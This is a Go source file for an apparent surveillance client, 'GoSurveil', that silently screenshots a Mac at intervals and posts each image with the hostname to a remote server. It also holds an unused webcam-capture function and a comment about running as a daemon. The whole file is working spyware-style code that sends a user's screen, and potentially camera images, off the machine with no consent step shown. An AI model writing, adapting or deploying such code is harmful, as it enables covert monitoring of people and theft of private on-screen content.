/*

Client Library for Computer Survilliance

Usage:

./client --server http://192.168.0.133 -frecuency 30

This sends the data every 30 seconds to 192.168.0.133.

- TODO: Create TMP only if not present
*/

package main

import (
	"fmt"
	"github.com/codegangsta/cli"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"time"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func main() {

	app := cli.NewApp()
	app.Name = "GoSurveil Client"
	app.Usage = "your computer is listening"

	app.Version = "0.1"
	app.Author = "Ivan Acosta-Rubio"
	app.Email = "@ivanacostarubio"

	app.Flags = []cli.Flag{
		cli.StringFlag{
			Name:  "server",
			Value: "http://127.0.0.1:8000/log/",
			Usage: "The server were we send the data",
		},
		cli.StringFlag{
			Name:  "frecuency",
			Value: "5",
			Usage: "How frecuent we send data to the server",
		},
	}

	app.Action = func(c *cli.Context) {

		host := c.String("server")

		f := c.String("frecuency")
		ff, err := strconv.Atoi(f)
		frecuency := time.Duration(ff)

		if err != nil {
			panic(err)
		}

		mainLoop(host, frecuency)
	}

	app.Run(os.Args)
}

func mainLoop(host string, frecuency time.Duration) {
	for {
		createTMPDirectory()
		// Register as a Daemon OSX
		// Check for update
		httpPost(screenCapture(), host)
		//		httpPost(facetime(), host)
		time.Sleep(frecuency * time.Second)
	}
}

func facetime() string {

	_, err := exec.Command("sh", "-c", "./imagesnap ./tmp/hello.jpg").Output()
	if err != nil {
		log.Fatal(err)
	}

	dat, err := ioutil.ReadFile("./tmp/hello.jpg")
	check(err)
	return string(dat)
}

func screenCapture() string {

	_, err := exec.Command("sh", "-c", "screencapture -x ./tmp/mailme.jpg").Output()

	if err != nil {
		log.Fatal(err)
	}

	dat, err := ioutil.ReadFile("./tmp/mailme.jpg")
	check(err)
	return string(dat)
}

func topInfo() string {
	return abstractCommand("top -l 1 -o cpu -n 10")
}

func userInfo() string {
	return abstractCommand("uname -a")
}

func abstractCommand(c string) string {

	out, err := exec.Command("sh", "-c", c).Output()

	if err != nil {
		log.Fatal(err)
	}

	return string(out)
}

func computerName() string {
	return abstractCommand("hostname")
}

func createTMPDirectory() {
	os.Mkdir("."+string(filepath.Separator)+"/tmp", 0777)
}

func httpPost(data string, host string) {

	resp, err := http.PostForm(host, url.Values{"message": {data}, "hostname": {computerName()}})

	fmt.Println(computerName())

	if err != nil {
		log.Print(err)
		fmt.Println("E \n %s", resp)
	} else {
		fmt.Print(".")
	}

}
